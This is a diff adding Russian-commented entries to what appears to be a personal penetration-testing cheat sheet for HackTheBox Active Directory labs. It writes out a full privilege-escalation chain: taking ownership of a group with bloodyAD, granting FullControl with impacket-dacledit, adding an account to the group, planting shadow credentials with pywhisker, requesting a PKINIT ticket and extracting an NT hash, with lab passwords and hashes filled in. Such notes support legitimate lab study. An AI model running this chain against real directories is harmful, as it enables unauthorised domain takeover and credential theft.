@@ -78,3 +78,27 @@ Silvercore_21
 
 
     certipy shadow auto -u 'ryan@sequel.htb' -p "WqSZAF6CysDQbGb3" -account 'ca_svc' -dc-ip '10.10.11.51'
+   
+   # Write Owner
+
+ делаем себя владельцем
+ bloodyAD --host "10.10.11.61" -d "haze.htb" -u "Haze-IT-Backup$" -p ":84d6a733d85d9e03f46eba25b34517a9" set owner SUPPORT_SERVICES Haze-IT-Backup$
+
+ добавляем все права
+
+ impacket-dacledit -action write -rights FullControl -principal 'Haze-IT-Backup$' -target-dn 'CN=SUPPORT_SERVICES,CN=USERS,DC=HAZE,DC=HTB' -dc-ip 10.10.11.61 "haze.htb/Haze-IT-Backup$" -hashes ':84d6a733d85d9e03f46eba25b34517a9'
+
+
+ добавляем себя в группу
+ bloodyAD --host "10.10.11.61" -d "haze.htb" -u "Haze-IT-Backup$" -p ":84d6a733d85d9e03f46eba25b34517a9" add groupMember SUPPORT_SERVICES Haze-IT-Backup$
+
+ делаем SHADOW CREDENTIALS
+ python ./pywhisker/pywhisker.py -d "haze.htb" -u "Haze-IT-Backup$" -H '84d6a733d85d9e03f46eba25b34517a9' --target edward.martin --action add 
+
+ запрашиваем TGT
+ python ./PKINITtools/gettgtpkinit.py -cert-pfx yraSYsjJ.pfx  -pfx-pass jfew7VTdOnphPokoLwAF haze.htb/edward.martin edward.ccache
+
+ Получение нтлм хеша из ключ сессии Kerberos
+
+ python getnthash.py -key b5fbdc5fe339b991ac044d8e82fcabf94e01cc86feeaba0be192391073d0b5e0 haze.htb/edward.martin
+
